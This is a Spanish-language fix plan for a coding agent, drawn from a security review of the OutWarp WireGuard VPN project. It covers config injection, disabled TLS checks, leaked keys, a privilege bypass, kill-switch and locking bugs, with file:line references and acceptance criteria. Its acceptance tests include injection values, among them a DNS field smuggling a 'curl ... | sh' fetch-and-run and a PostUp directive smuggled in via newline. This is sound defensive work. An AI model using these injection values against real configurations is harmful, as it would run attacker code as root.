# OutWarp — Plan de corrección (para agente)

> **Documento de trabajo para un agente de codificación.** Deriva de la revisión completa en
> `2026-09-01-review.md`. Ese fichero explica el *porqué*; este dice *qué hacer*.

```yaml
repo: https://github.com/fcrespo07/OutWarp.git
commit_revisado: 70b2214
fecha_revision: 2026-09-01
tareas: 13 defectos + 6 refactors de concepto
```

## Cómo usar este documento

1. Trabaja de arriba abajo: las tareas están en orden de prioridad, y las dependencias están
   declaradas en cada una.
2. Cada tarea tiene `criterio_de_aceptación`. No la des por cerrada sin cumplirlo.
3. Toda referencia `fichero:línea` es válida en `70b2214`. Si trabajas sobre un commit posterior,
   **verifica la línea antes de editar** — no apliques un parche a ciegas.
4. Los ítems `CONCEPTO-*` son refactors, no parches. No los mezcles en el mismo PR que los `FIX-*`.
5. Si al abrir un fichero la premisa del hallazgo no se cumple, **para y repórtalo**. No inventes
   una corrección para un problema que no has confirmado.

---

## Grupo 1 — Seguridad. Hacer primero.

### FIX-01 · Validar la entrada de configuración antes de que llegue a un `.conf`

- **Severidad:** crítica · **Tipo:** ejecución de código como root/SYSTEM
- **Depende de:** nada. Es la base de FIX-13a.

**Problema.** Los `.conf` de WireGuard se generan interpolando f-strings con valores nunca
validados. `wg-quick` (Linux) y el servicio `WireGuardTunnel$` (Windows, elevado) ejecutan las
líneas `PostUp =` / `PreDown =` como shell. Un `\n` en cualquier campo inyecta una directiva nueva.

**Ficheros:**

| Ruta | Qué pasa ahí |
|---|---|
| `client/outwarp/wireguard.py:197-211` | `_dns_lines_for` emite `PostUp = resolvectl dns %i {dns_str}` desde `wg.dns` |
| `client/outwarp/wireguard.py:234-252` | `build_wg_conf` interpola `client_private_key`, `client_address`, `server_public_key`, `preshared_key` |
| `client/outwarp/config.py:437-462` | `_parse_wireguard` — punto de filtrado. Hoy valida **solo** `mtu` (576-1500) |
| `server/outwarp_server/wireguard.py:173-179` | `subnet` embebido dos veces en la línea `iptables ... MASQUERADE` |
| `server/outwarp_server/wireguard.py:190,193-194` | `client.name`, `client.psk`, `client.address` volcados en `wg0.conf` |
| `server/outwarp_server/config.py:174-181`, `:198-199` | `_parse` construye `ClientEntry` y lee `subnet`/`server_address` con `str(...)` |

**Qué hacer.** Una función de validación por sección, ejecutada **en el parseo**, no en el consumidor:

- Claves WG → el regex base64 de 44 caracteres que el servidor ya tiene: `_WG_KEY_RE` en
  `server/outwarp_server/enroll_server.py:36`. Reutilízalo, no escribas otro.
- Direcciones y subredes → `ipaddress.ip_interface()` / `ipaddress.ip_network()`.
- `dns` → `ipaddress.ip_address()`. **Esta validación ya existe**: `_parse_ip_list` en
  `client/outwarp/config.py:776`, usada solo en el editor de perfiles. Aplícala también al importar.
- `tunnel_name` → `[A-Za-z0-9_-]{1,15}`.
- Red de seguridad final: rechazar `\n` y `\r` en **todo** campo destinado a un `.conf`.

**Referencia de estilo:** `client/outwarp/config.py:395-418` ya valida `tls.spki_sha256` y
`tls.cert_fingerprint_sha256` contra `_FINGERPRINT_RE` y aborta la carga. Sigue ese patrón.

**criterio_de_aceptación:**
- Un `.owcfg` con `"dns": ["1.1.1.1; curl http://x/y.sh|sh"]` es rechazado en el parseo.
- Un `.owcfg` con `"client_address": "10.0.0.2/32\nPostUp = touch /tmp/pwned"` es rechazado.
- Un `server_config.json` con `\n[Peer]\nPublicKey = ...` en `client.name` es rechazado.
- Tests nuevos para los tres casos.

---

### FIX-02 · `enroll.py` no debe desactivar TLS en modo `ca`/`acme`

- **Severidad:** crítica · **Tipo:** MITM en el establecimiento de confianza
- **Depende de:** nada.

**Problema.** `client/outwarp/enroll.py:136-140`:

```python
ctx = None
if url.startswith("https://"):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
```

Se aplica a toda URL https **sin mirar `tls.verify`**. El comentario de `enroll.py:133-135` afirma
lo contrario (*"For a CA-mode profile the default context does the verifying, so it is left in
place"*), y `_verify_endpoint` (`enroll.py:106-111`) se salta su propio pinning **confiando en esa
premisa falsa**. Resultado: el POST con el token de enrolment de un solo uso y la clave pública
viaja sin verificar certificado, justo en el modo que
`server/outwarp_server/config.py:53-58` describe como el recomendado.

**Qué hacer.** Construir el contexto según el modo:
- `tls.verify == "ca"` → `ssl.create_default_context()` **intacto**.
- Solo relajar cuando hay un pin que ya autenticó el endpoint.
- `_post()` hoy no recibe `config` — probablemente la causa raíz de que esto acabara así. Pásaselo.
- **Corrige también el comentario.** Un comentario que describe un comportamiento inexistente es lo
  que hizo que `_verify_endpoint` renunciara a su comprobación.

**criterio_de_aceptación:** con un perfil `tls.verify == "ca"` y un certificado no confiable, el
enrolment falla. Test que lo afirme.

---

### FIX-05 · `rotate-client` no debe dejar la clave privada en `Path.cwd()`

- **Severidad:** alta · **Tipo:** exposición de secreto en disco
- **Depende de:** nada.

**Problema.** `server/outwarp_server/server_manager.py:295`:
`warpcfg_path = Path.cwd() / f"{name}.owcfg"`. Se lee de vuelta en
`server/outwarp_server/api.py:790` y **nunca se borra** (grep: sin `unlink` en el fichero).
En headless, `Path.cwd()` es el directorio del servicio systemd o el `WorkingDir` del contenedor.
El panel corre como root (`server/outwarp_server/web_server.py:21`). Cada rotación deja ahí la clave
privada, indefinidamente, y entra entera en cualquier backup del volumen.

**La salida ya existe y no se usa:** `server/outwarp_server/operations.py:106` y `:324` aceptan
`output_dir`, con `or Path.cwd()` como fallback (`operations.py:196`, `:389`).
`add_client` (`server_manager.py:218-224`) no lo pasa; `rotate_client_keys` ni siquiera pasa por
`operations` — construye la ruta a mano.

**Qué hacer.** `tempfile.mkdtemp()` como `output_dir`, leer bytes, borrar el directorio en un
`finally`. Que `rotate_client_keys` delegue en `operations` como ya hace `add_client`.

**NO hagas:** no toques `add_client` buscando la misma fuga. Verificado en
`server/outwarp_server/operations.py:137-140`: con `enroll=True` (lo que `add_client` pasa siempre,
`server_manager.py:222`) `client_private_key` se queda en `""` y no se genera clave en el servidor.
Ahí lo huérfano es el token de enrolment, sensible pero de un solo uso y vida corta.

**criterio_de_aceptación:** tras `rotate-client`, no queda ningún `.owcfg` fuera del directorio
temporal. Test que lo verifique.

---

### FIX-09 · `--config-dir` no debe desactivar el check de root

- **Severidad:** alta · **Tipo:** escalada de privilegios
- **Depende de:** nada. Cambio de tres líneas.

**Problema.** `server/outwarp_server/cli.py:1211-1213`:

```python
# Skip the root check when --config-dir points to a writable location
# (used by tests). Real installations always use the default /etc path.
if args.command in _PRIVILEGED_COMMANDS and not args.config_dir:
    _require_root(args.command)
```

El código no comprueba si el directorio es escribible ni si viene de tests. La mera presencia de la
bandera desactiva el único gate de privilegios de todos los `_PRIVILEGED_COMMANDS`, incluido
`admin-token --rotate`. Y *"Real installations always use the default /etc path"* es falso: el
despliegue en contenedor monta `/data` (`README.md`, `docker run -v outwarp-data:/data`).

**Qué hacer.** Condicionar el bypass a `OUTWARP_TEST_MODE=1` en el entorno, no a una bandera de
línea de comandos. Actualiza el comentario para que diga la verdad.

**criterio_de_aceptación:** `outwarp-server admin-token --rotate --config-dir /tmp/x` sin root y sin
`OUTWARP_TEST_MODE` falla. La suite sigue verde.

---

## Grupo 2 — Corrección. Bugs que muerden en producción.

### FIX-03 · Kill switch: allowlist incompleto y fail-open silencioso

- **Severidad:** alta · **Tipo:** control de seguridad inefectivo + bloqueo del usuario
- **Depende de:** idealmente CONCEPTO-B; se puede hacer antes.

**Defecto A — allowlist incompleto.** `client/outwarp/api.py:504` usa
`list(self._manager.config.routing.bypass_ips)` a secas. La función correcta ya existe:
`all_bypass_ips` en `client/outwarp/fallback.py:266-287` une `routing.bypass_ips` +
`config.server.endpoint` + endpoint y bypass de **cada peldaño del fallback**. Ya está testeada
(`client/tests/test_fallback.py:192`) y ya se importa en `tunnel.py:22`.
Impacto: el kill switch se activa en `RECONNECTING`/`FAILED` (`api.py:503`) — justo cuando hace
falta hablar con el servidor — y como `bypass_ips` no suele incluir el endpoint, corta también ese
tráfico. El cliente no puede reconectar solo.

**Defecto B — fail-open silencioso.** Si `bypass_ips` viene vacío, `api.py:505-511` hace
`log.warning` y `return`, sin `_record_log(...)` — que es lo que alimenta el log visible en TUI y
panel, y que el camino de éxito sí llama (`api.py:512`). En `api.py:1130-1134` es peor:
`if allowlist: plat.engage_kill_switch(allowlist)` sin `else` ni warning.
Impacto: la UI dice "activado" y no protege nada.

**Qué hacer.** Llamar a `all_bypass_ips()` desde los **dos** sitios de `api.py` (`:504` y
`:1130-1134`). Que el caso "no puedo montar el kill switch" pase por `_record_log("error", ...)` y
por el estado que ve la UI.

**criterio_de_aceptación:** el allowlist del kill switch incluye el endpoint del servidor y los de
cada peldaño. Con allowlist vacío, la UI muestra error, no "activado". Tests para ambos.

---

### FIX-04 · Alta/rotación/revocación de clientes sin lock

- **Severidad:** alta · **Tipo:** corrupción de estado, pérdida silenciosa de peers
- **Depende de:** este es el parche puente. La solución real es CONCEPTO-A.

**Problema.** `server/outwarp_server/server_manager.py:204-228` (`add_client`), `:245-298`
(`rotate_client_keys`), `:300-321` (`revoke_client`) hacen leer-modificar-escribir sobre
`self._config` + `save()` sin lock. `ServerManager` tiene `self._lock`
(`server_manager.py:130`) usado **solo** en `start()` (`:150`). El panel las sirve desde un
`ThreadingHTTPServer` (`server/outwarp_server/web_server.py:124-125`, `daemon_threads = True`).

Dos POST casi simultáneos a `/api/add_client` parten de la misma foto de `config.clients`:
`next_available_ip` asigna la **misma IP** a dos clientes, y la segunda escritura pisa la primera.
El cliente A ya tiene su `.owcfg` y su peer añadido en vivo, pero el fichero en disco no lo recuerda
— falla semanas después, al reiniciar el servicio, sin ningún error.

**Y entre procesos**, donde un lock de Python no ayuda: `server/outwarp_server/config.py:101-111`
(`save`) no toma lock de fichero, y todo el locking existente
(`enrollment.py:44` `_write_lock`, `enroll_server.py:60` `enroll_lock`) es `threading.Lock`.
El daemon de enrolment es un proceso; `outwarp-server revoke-client` es otro.

**Qué hacer (parche puente).** Envolver las tres operaciones del manager en `self._lock`, y añadir
un `flock` sobre el fichero de config alrededor del ciclo load-mutate-save en `config.py`.

**criterio_de_aceptación:** test que lanza N `add_client` concurrentes y afirma N IPs distintas y N
clientes persistidos.

---

### FIX-06 · `outwarp-cli uninstall` se suicida y deja el kill switch puesto

- **Severidad:** alta · **Tipo:** el desinstalador no desinstala + usuario sin red
- **Depende de:** nada.

**Defecto A — se suicida.** `client/outwarp/uninstall.py:170-183` (`_kill_running`) ejecuta
`pkill -f outwarp` en Linux, invocado en `:280`, primera línea de trabajo de `main()`. El proceso que
desinstala es `.../bin/python .../bin/outwarp-cli uninstall` — su argv contiene `outwarp`. `pkill`
excluye su propio PID, no el de quien lo llamó. No hay manejador de `SIGTERM` en este camino
(los únicos `signal.signal` del cliente están en `cli.py:129-130`, `cli.py:235-236` y
`service.py:85-87`). Muere en la línea 280: no borra config, accesos directos, shims ni venv.
`client/tests/test_uninstall.py` no menciona `_kill_running` ni `pkill`.

> **Confianza:** alta sobre el mecanismo (argv y ausencia de manejador verificados). El
> desinstalador no se ha ejecutado. El entry point es literalmente `outwarp-cli`
> (`client/pyproject.toml:65`). **Confirma esto antes de parchear.**

**Defecto B — no libera el estado de red.** `uninstall.py` no menciona `release_kill_switch` ni
`uninstall_wg_tunnel` (grep: cero coincidencias). La limpieza vive en
`client/outwarp/api.py:1291-1304` (`shutdown()`) y solo se dispara desde el "Quit" de la bandeja.
Impacto: desinstalar con el kill switch activo deja las reglas nftables/`netsh` **vivas tras la
desinstalación**. Usuario sin red y sin herramienta para revertirlo. Combinado con FIX-03a, sin
camino de recuperación obvio.

**Qué hacer.** `pkill -f 'outwarp-cli (gui|connect|tui|daemon)'` o, mejor, un fichero de PID. Y
**antes** de matar nada, un paso explícito de `release_kill_switch()` + `uninstall_wg_tunnel()` que
no dependa de que un proceso vivo colabore.

**criterio_de_aceptación:** `uninstall` completa todos sus pasos. Tras desinstalar con kill switch
activo, no quedan reglas de firewall de OutWarp. Test que cubra `_kill_running`.

---

### FIX-07 · Windows: `restart_wg()` borra el NAT y no lo recrea

- **Severidad:** alta · **Tipo:** pérdida total de conectividad de clientes, en silencio
- **Depende de:** la cura de fondo es CONCEPTO-E.

**Problema.** `server/outwarp_server/platforms/windows.py:108-114` (`restart_wg` →
`uninstall_wg_config` + `install_wg_config`). `uninstall_wg_config` (`:100-106`) ejecuta
`self._remove_nat()` incondicionalmente; `install_wg_config` (`:66-90`) **nunca** llama a
`_create_nat`. La única función que crea el NAT es `prepare_system()` (`:124-128`).

Se alcanza desde `reload_wg` (`windows.py:92-94`), desde `operations.restart_services()` (el comando
`outwarp-server restart`), desde el asistente al re-ejecutarse, y desde la API al cambiar el puerto
WG. En todos: los clientes completan el handshake pero pierden toda salida a internet.

**Este fallo ya ocurrió antes.** `platforms/windows.py:261-266` lleva el comentario: *"Used to be a
silent log.warning here. The result was a server that appeared healthy (wstunnel listening, WG
handshakes completing) but produced no return traffic."* Y `KNOWN_BUGS.md:39` lo registra como
B-005 (resuelto). Se arregló por la vía de "crear el NAT", no por la de "no destruirlo".

**Qué hacer.** Que `WindowsServerPlatform.restart_wg()` vuelva a invocar `_create_nat(subnet)` tras
reinstalar el túnel. Necesita el `subnet`: pásalo o guárdalo en la instancia.

**Aparte:** `server/outwarp_server/platforms/base.py:101-106` documenta `prepare_system()` como
*"Called once after first-run setup wizard completes"*. Verificado en
`server/outwarp_server/server_manager.py:358`: corre en **cada arranque**. Corrige el comentario.

**criterio_de_aceptación:** tras `restart_wg()` en Windows, la regla NAT existe. Test o comprobación
manual documentada.

---

### FIX-11 · `add_peer_live` / `remove_peer_live` sin timeout bajo el lock global

- **Severidad:** media · **Tipo:** DoS permanente del enrolment por fallo transitorio
- **Depende de:** nada. Cambio de dos líneas.

**Problema.** `server/outwarp_server/wireguard.py:228` (`add_peer_live`) y `:248-254`
(`remove_peer_live`) llaman a `subprocess.run` sin `timeout=`, desde
`server/outwarp_server/enroll_server.py:130-131,149` **dentro de** `with self.ctx.enroll_lock:`.
En el mismo fichero, `get_live_peers` (`:76-82`) **sí** lleva `timeout=5`: se pensó para la ruta de
lectura y no para las de escritura. Si `wg` se cuelga, el hilo que sostiene `enroll_lock` no vuelve,
y ningún cliente puede enrolarse hasta reiniciar el servicio.

**Qué hacer.** `timeout=5` en ambos, igual que `get_live_peers`. Tratar `TimeoutExpired` como
`WireGuardError` para que el lock se libere por el `finally`.

**criterio_de_aceptación:** con `wg` simulado colgado, `add_peer_live` levanta `WireGuardError` en
≤5s y el lock queda libre.

---

## Grupo 3 — Endurecimiento.

### FIX-08 · Rate limiter del enrolment colapsa detrás de Caddy

- **Severidad:** media · **Tipo:** DoS trivial + pérdida de trazabilidad

`server/outwarp_server/enroll_server.py:74-75` (`_client_ip`) devuelve `self.client_address[0]` y
nunca mira `X-Forwarded-For` (grep: la cadena `X-Forwarded` no aparece en ningún fichero de
`server/`). En `tls_mode="acme"` el listener bindea a `127.0.0.1`
(`enroll_server.py:205`) y todo llega proxied desde Caddy: **todos comparten `127.0.0.1`**. Con
`max_failures=5` / `lockout=60s` (`:97,142`), un cliente que falle cinco veces bloquea el enrolment
de todos. Y `"enrolment refused from %s"` (`:143`) siempre imprime `127.0.0.1`.

**Qué hacer.** Con `behind_reverse_proxy = True`, leer la IP de `X-Forwarded-For` (**el último
salto, no el primero**) y hacer que Caddy la establezca. Con `False`, seguir con `client_address`.
La condición ya existe y ya gobierna el bind — que gobierne también esto.

**criterio_de_aceptación:** detrás de proxy, dos clientes con IP distinta en `X-Forwarded-For` tienen
cubos de rate limit independientes.

---

### FIX-10 · Panel web sin timeout de socket (slowloris pre-auth)

- **Severidad:** media · **Tipo:** DoS pre-autenticación

`server/outwarp_server/web_server.py:147` (`_PanelHandler(BaseHTTPRequestHandler)`) no define el
atributo de clase `timeout`, y `_PanelServer` (`:124-125`) es `ThreadingHTTPServer` con
`daemon_threads = True`. La conexión recibe hilo **antes** de que `_authed()` se evalúe. Variante ya
autenticada: el bucle SSE de `:322-355` solo termina cuando falla una escritura al socket.

> `web_auth.py` está bien hecho — scrypt, `compare_digest`, sesiones con TTL, rate limit por IP.
> El agujero no está en la autenticación, sino en que se agota el proceso antes de llegar a ella.
> **No lo reescribas.**

**Qué hacer.** `timeout = 30` como atributo de clase en `_PanelHandler`. Heartbeat con contador de
reintentos en el bucle SSE.

**criterio_de_aceptación:** una conexión que no envía cabeceras se cierra en ~30s.

---

### FIX-12 · Instalador desatendido de Windows sin verificar checksum

- **Severidad:** media · **Tipo:** ejecución de binario no verificado con elevación

`scripts/install-from-release.ps1:79-113`: `Download-Installer` descarga con `Invoke-WebRequest` e
`Invoke-Installer` lanza con `Start-Process -Verb runAs` sin comprobación intermedia.
El proyecto **genera y publica** `SHA256SUMS.txt` (`installer/windows/build/build.py:247-271`,
`scripts/release.sh`), y el instalador de Linux **sí** lo verifica
(`installer/linux/install.sh:533-577`: descarga el manifiesto, aborta si el fichero no está listado,
compara `sha256sum`). El auto-actualizador también. El único que no comprueba nada es el script que
`README.md` recomienda para *"automated / unattended deploys (Intune, Ansible, …)"*.

**Qué hacer.** Copiar el patrón de `install.sh`: descargar `SHA256SUMS.txt` del mismo release,
comparar con `Get-FileHash -Algorithm SHA256`, abortar si no coincide. Diez líneas.

**criterio_de_aceptación:** con un `.exe` alterado, el script aborta sin ejecutarlo.

---

### FIX-13 · Menores

- **13a · Caddyfile sin validar dominio.** `server/outwarp_server/caddy.py:113-127`: `domain` y
  `acme_email` se interpolan crudos en `{domain} {{ ... }}` y `email {acme_email}`. Un valor con
  `{`, `}`, `\n` o espacio rompe la sintaxis o inyecta directivas. Solo se alcanza desde
  `setup_wizard.py` (operador local con root), así que el radio real es un typo del admin. Añade
  regex de hostname antes de escribir. *(Se resuelve solo si FIX-01 se aplica bien arriba.)*
- **13b · Extracción de tar sin `filter`.** `scripts/fetch_bundled_binaries.py:85-90`:
  `tf.extract(members[0], path=tmp_path)` sin `filter="data"` (PEP 706). El filtro previo por
  `m.name.endswith("wstunnel.exe")` estrecha el vector y la URL es del upstream oficial: riesgo bajo.
  Un argumento y listo.
- **13c · `ci.yml` sin `permissions:`.** `.github/workflows/ci.yml`, a diferencia de
  `docker-publish.yml` (`contents: read, packages: write`), `windows-installer.yml` y `release.yml`
  (`contents: write`). Sus tres jobs solo necesitan `contents: read`. Una línea.
- **13d · JSX muerto que se empaqueta.** `server/outwarp_server/ui/srv-a.jsx`, `srv-b.jsx`,
  `srv-data.jsx`, `shared.jsx`, `confirm.jsx` no están en `SERVER_ORDER`
  (`scripts/build_ui.py:36-47`), y el comentario del script dice que *"the old srv-a/srv-b desktop
  GUI was replaced by this dash-\* set"*. Bórralos.

---

## Refactors de concepto

> No los metas en el mismo PR que los `FIX-*`. Cada uno es una decisión de diseño: si no estás de
> acuerdo con la propuesta, dilo antes de implementarla.

### CONCEPTO-A · Sacar el registro de peers de `ServerConfig` a SQLite

**Absorbe:** FIX-04 entero, buena parte de FIX-05. **Coste:** ~2 días.

`ServerConfig` (`server/outwarp_server/config.py:34-65`) es un dataclass congelado que mezcla tres
naturalezas incompatibles: secretos del servidor (`wg_private_key`, `cert_path`, `key_path`),
ajustes de instalación (`endpoint`, `port`, `subnet`, `tls_mode`, `enroll_port`) y
`clients: list[ClientEntry]` — un registro transaccional con ciclo de vida por elemento. Lo tercero
comparte con lo demás el mismo JSON reescrito entero en cada mutación (`config.py:101-111`).

**El proyecto ya tiene SQLite:** `server/outwarp_server/traffic_history.py`, con SQL parametrizado y
manejo de errores consistente. Se eligió una base de datos para el histórico de tráfico —datos
derivados y desechables— y un JSON a pelo para el estado autoritativo del que depende el acceso.

**Propuesta.** `clients` a su propia tabla en la base que ya existe. Las operaciones pasan a
`INSERT`/`UPDATE`/`DELETE` con transacción, y las dos carreras de FIX-04 dejan de ser posibles por
construcción. `ServerConfig` se queda siendo lo que su nombre dice.
**Migración:** leer `clients` del JSON, insertar, dejar el campo por compatibilidad una versión.
**Toca:** `operations.py`, `server_manager.py`, `enroll_server.py`.

*Contexto:* `KNOWN_BUGS.md:92` documenta B-013 (*"`list-clients` no refleja cambios entre
ejecuciones rápidas"*) — el mismo problema de fondo, tratado entonces como bug de refresco.

---

### CONCEPTO-B · Un solo dueño para "qué escapa del túnel"

**Absorbe:** FIX-03a y previene su regreso. **Coste:** una tarde.

El conjunto se calcula en cuatro sitios con tres respuestas distintas:

| Dónde | Qué incluye |
|---|---|
| `client/outwarp/wireguard.py:228-232` (`build_wg_conf`) | `bypass_ips` + `server.endpoint` + `extra_bypass` |
| `client/outwarp/fallback.py:266-287` (`all_bypass_ips`) | `bypass_ips` + `server.endpoint` + endpoint y bypass de **cada peldaño** |
| `client/outwarp/api.py:504` (`_sync_kill_switch`) | `bypass_ips` y nada más |
| `client/outwarp/api.py:1130-1132` (toggle en caliente) | `bypass_ips` y nada más |

`all_bypass_ips` es la respuesta correcta, está testeada (`client/tests/test_fallback.py:192`) y en
uso desde `tunnel.py:281`. Pero no está *nombrada como concepto*: vive en `fallback.py` y parece
propiedad de la escalera de reconexión. Quien montó el kill switch no la vio y reconstruyó una
versión más pobre. Dos veces.

**Propuesta.** `escape_set(config, ladder) -> list[str]` en un módulo neutral (no `fallback.py`), con
los cuatro consumidores llamándola. Y **un test que afirme que el allowlist del kill switch es un
superconjunto de los `AllowedIPs` excluidos del túnel** — esa invariante impide que FIX-03a vuelva.

---

### CONCEPTO-C · Declarar la frontera de confianza del `.owcfg`

**Absorbe:** FIX-01 como política, no como parche. **Coste:** la regla es gratis; firmar, ~1 día.

FIX-01 son cuatro sitios pero un solo error: **no hay decisión escrita sobre si el fichero de perfil
es entrada confiable**. La prueba de que nunca se tomó es que el código hace las dos cosas a la vez:
`tls.spki_sha256` y `tls.cert_fingerprint_sha256` validados y abortando la carga
(`client/outwarp/config.py:395-418`), mientras `client_private_key`, `client_address`, `tunnel_name`
y `dns` pasan por `str(...)` hacia un fichero que ejecuta root. En el servidor, idéntico: `port`,
`tls_mode`, `enroll_port` validados; `subnet`, `server_address` y los tres campos de `ClientEntry`,
no.

**Propuesta 1.** Escribir la regla y aplicarla en el parseo: *el `.owcfg` es entrada hostil;
`server_config.json` es semi-confiable pero se valida igual porque es defensa en profundidad
barata*. Lo valioso no es el código: es que **añadir un campo nuevo obligue a decidir cómo se
valida**, en vez de que el default silencioso sea "no se valida".

**Propuesta 2.** Firmar el `.owcfg` con la clave minisign del servidor. La infraestructura **ya
existe y funciona**: `server/outwarp_server/minisign.py`, `client/outwarp/minisign.py`,
`outwarp-release.pub`, `docs/RELEASE_SIGNING.md`. Se usa esa maquinaria para verificar releases,
pero el perfil que da acceso a la VPN viaja sin firmar por email, USB o mensajería, cargando un
token de enrolment.

---

### CONCEPTO-D · `ClientEntry` no modela el ciclo de vida real

**Coste:** casi gratis si se hace junto a CONCEPTO-A.

`ClientEntry` (`server/outwarp_server/config.py:20-32`) tiene `name`, `public_key`, `address`, `psk`,
`expires_at`. Un cliente pendiente de enrolar se representa con `public_key == ""`, y el resto del
código parchea esa convención: `server/outwarp_server/wireguard.py:184-188` salta los peers sin clave
(con un comentario explicando que un `[Peer]` sin `PublicKey` tumba la interfaz entera), y
`_parse_wireguard(enrolling=...)` (`client/outwarp/config.py:437,450-454`) relaja el requisito de
clave privada. Una cadena vacía haciendo de máquina de estados.

Los estados reales son al menos cuatro: *reservado sin token*, *token emitido y vivo*, *enrolado*,
*revocado*. El modelo distingue dos, y por ausencia. No se puede responder "¿este cliente nunca se
enroló, o se enroló y lo revoqué?" — revocar borra la fila (`server_manager.py:313`). No hay
`enrolled_at`. Un token caducado sin redimir deja una IP reservada que nadie reclama.

**`expires_at` merece atención propia.** Su comentario (`config.py:27-31`) lo admite: *"The server
doesn't auto-revoke; the `prune-expired` command and the client (which refuses an expired .owcfg)
enforce it."* La caducidad la aplican (a) un comando que alguien debe recordar ejecutar y (b) **el
propio cliente al que se le está caducando el acceso**. Lo segundo no es un control: quien tenga el
`.owcfg` edita la fecha con un editor de texto y el servidor lo acepta, porque su `wg0.conf` sigue
teniendo el peer. **Un acceso que expira solo si el titular coopera no expira.**

**Propuesta.** Campo `state` explícito y `enrolled_at`. Caducidad aplicada **en el servidor**:
`prune_expired` como tarea periódica del daemon (ya hay un `_traffic_scheduler`,
`server_manager.py:165-171`), o chequeo de `expires_at` en `complete_enrollment` y en la
regeneración de `wg0.conf`.

---

### CONCEPTO-E · Nadie es dueño del estado de red del sistema

**Absorbe:** FIX-07 y FIX-06b, y toda su familia. **Coste:** medio.

En Windows el NAT lo crea `prepare_system()` y lo destruye `uninstall_wg_config()`
(`platforms/windows.py:105`), invocado desde `restart_wg()` — que no llama a `prepare_system()`.
De ahí FIX-07. En Linux el equivalente vive en las líneas `PostUp`/`PostDown` del `wg0.conf`
(`wireguard.py:173-179`), donde sí es simétrico porque `wg-quick` lo garantiza. Dos plataformas, dos
modelos de propiedad, y la abstracción común (`platforms/base.py`) no dice cuál es el contrato.

En el cliente, lo mismo con el kill switch: lo monta `api._sync_kill_switch` y se supone que lo
suelta `api.shutdown()`, pero cualquier muerte del proceso que no pase por ahí lo deja puesto — que
es FIX-06b.

**El patrón:** hay estado que vive **fuera del proceso** (reglas de firewall, NAT, interfaces) y
cuyo ciclo de vida se ha atado al ciclo de vida de un objeto Python. Cuando el proceso muere de
forma imprevista, el estado externo sobrevive huérfano.

**Propuesta.** Que la capa de plataforma exponga un `reconcile(desired_state)` **idempotente** en vez
de `prepare`/`install`/`uninstall` que hay que llamar en el orden correcto. Se invoca al arrancar y
tras cada cambio, y compara lo que hay con lo que debería haber. `_create_nat` ya está a medio
camino: comprueba si el NAT existe antes de crearlo (`windows.py:248-253`).

---

### CONCEPTO-F · Convertir documentación en tests

**Coste:** bajo, alto retorno.

En la raíz conviven `CLAUDE.md` (35 KB), `OutWarp UI Spec.md` (61 KB), `KNOWN_BUGS.md`,
`OutWarp-fallos-y-plan.md`, `ROADMAP.md`, `RELEASE_NOTES_v0.4.1.md`, `RELEASE_NOTES_v0.4.2.md` y
`design_handoff_outwarp/` con otro `IMPLEMENTATION_PLAN.md` de 34 KB — con el proyecto en 0.11.0.
`KNOWN_BUGS.md` tiene diecisiete bugs resueltos y "Abiertos" vacía: ya no es una lista de bugs, es un
histórico, y ese trabajo lo hace git.

**No es cosmética.** FIX-07 existe en parte porque el conocimiento de *"el NAT desaparece y los
clientes pierden internet en silencio"* está en tres sitios (comentario en `windows.py:261-266`,
B-005 y B-012 en `KNOWN_BUGS.md`) y en ninguno como invariante comprobable. Lo que sobrevive a un
refactor es un test, no un `.md`.

**Propuesta.** `docs/histórico/` para las notas de release viejas y `KNOWN_BUGS.md`. De cada bug
resuelto que documente una invariante real (B-005, B-012, B-016, B-017), sacar un **test de
regresión**.

---

## No tocar

Verificado y sólido. Si un cambio te lleva aquí, párate y replantéalo:

- `installer/linux/install.sh` — `set -euo pipefail`, verificación SHA256 estricta contra el
  manifiesto, migración cuidadosa de instalaciones legacy, `visudo -cf` antes de instalar sudoers,
  helper privilegiado que valida entradas por regex. **Es el modelo para FIX-12.**
- `server/outwarp_server/web_auth.py` — scrypt, `hmac.compare_digest`/`secrets.compare_digest`,
  sesiones con TTL y lock, rate limiter por IP con ventana deslizante. Revisado entero por dos
  pasadas independientes sin un solo hallazgo.
- `updater.py` (ambos lados) y `minisign.py` — firma verificada antes de parsear el manifiesto,
  fail-closed en todos los caminos, sin `shell=True`.
- `traffic_history.py` — SQL parametrizado, errores consistentes. **Es el modelo para CONCEPTO-A.**
- Los comentarios que explican el *porqué*: `client/outwarp/wireguard.py:238-242` (aritmética del
  MTU 1380), `server/outwarp_server/wireguard.py:169-171` (por qué `iptables -I FORWARD 1` y no
  `-A`), `platforms/windows.py:261-266`. Consérvalos y actualízalos, no los borres.
- **La decisión de enrolment** — que la clave privada del cliente se genere en el cliente y el
  servidor nunca la vea — es la mejor decisión de diseño del proyecto. FIX-05 es precisamente que
  `rotate_client_keys` es el único camino que la traiciona.

---

## Cobertura de la revisión — dónde NO mirar con confianza

Esta lista existe para que no asumas que "no hay hallazgos" equivale a "está revisado".

- **Cubierto entero:** todo `server/outwarp_server/` salvo la TUI; todo `client/outwarp/` salvo
  `settings.py`, `notify.py`, `platforms/base.py`, `__main__.py` y la TUI; `scripts/`, `installer/`,
  `deploy/`, `.github/workflows/`.
- **No cubierto:** `client/outwarp/api.py` se leyó parcialmente (~350 de 1336 líneas) — los bloques
  de perfiles, bucle de estadísticas y bridge de settings **no se revisaron línea a línea**. Las TUI
  de Textual y los `.jsx` no se auditaron más allá de qué ficheros entran en el bundle. Las suites de
  tests se consultaron para verificar cobertura de hallazgos concretos, no se revisaron como código.
- **Todo hallazgo de este documento se verificó abriendo el fichero en `70b2214`.** El único con
  confianza no total es FIX-06a.

---

*Fuente: `2026-09-01-review.md` · commit `70b2214` · pasada de código Sonnet (4 subagentes), pasada
de concepto Opus.*
